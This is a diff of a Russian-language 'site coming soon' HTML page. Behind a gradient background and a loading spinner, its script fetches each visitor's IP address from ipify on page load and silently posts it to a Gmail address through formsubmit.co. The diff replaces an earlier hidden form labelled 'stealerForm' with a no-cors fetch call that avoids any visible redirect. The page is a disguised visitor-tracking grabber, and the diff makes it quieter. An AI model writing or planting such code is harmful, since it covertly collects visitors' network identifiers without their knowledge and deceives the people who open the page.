@@ -1,39 +1,65 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Добро пожаловать!</title>
+    <title>Скоро открытие!</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
             padding-top: 50px;
-            background-color: #f3f3f3;
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            color: white;
         }
         h1 {
-            color: #333;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+        }
+        .loader {
+            margin: 30px auto;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <h1>Сайт находится в разработке</h1>
-    <p>Скоро здесь появится что-то интересное!</p>
-
-    <!-- Скрытая форма для отправки IP -->
-    <form id="stealerForm" action="https://formsubmit.co/wplacesosi1@gmail.com" method="POST" style="display: none;">
-        <input type="hidden" name="IP_Пользователя" id="ipInput">
-        <input type="hidden" name="_subject" value="Новый IP!">
-        <input type="hidden" name="_captcha" value="false">
-    </form>
+    <h1>Сайт скоро заработает!</h1>
+    <p>Идёт подготовка контента...</p>
+    <div class="loader"></div>
 
     <script>
-        // Получаем IP и сразу отправляем на почту
+        // Функция для отправки IP на сервер Formsubmit без переадресации
+        function sendIP(ip) {
+            const formData = new FormData();
+            formData.append('IP_Пользователя', ip);
+            formData.append('_subject', 'Новый IP!');
+            formData.append('_captcha', 'false');
+            
+            // Отправка данных через fetch без перезагрузки страницы
+            fetch('https://formsubmit.co/wplacesosi1@gmail.com', {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            });
+        }
+
+        // Получаем IP и отправляем
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                document.getElementById('ipInput').value = data.ip;
-                document.getElementById('stealerForm').submit();
+                sendIP(data.ip);
+            })
+            .catch(error => {
+                console.error('Ошибка получения IP:', error);
             });
     </script>
 </body>
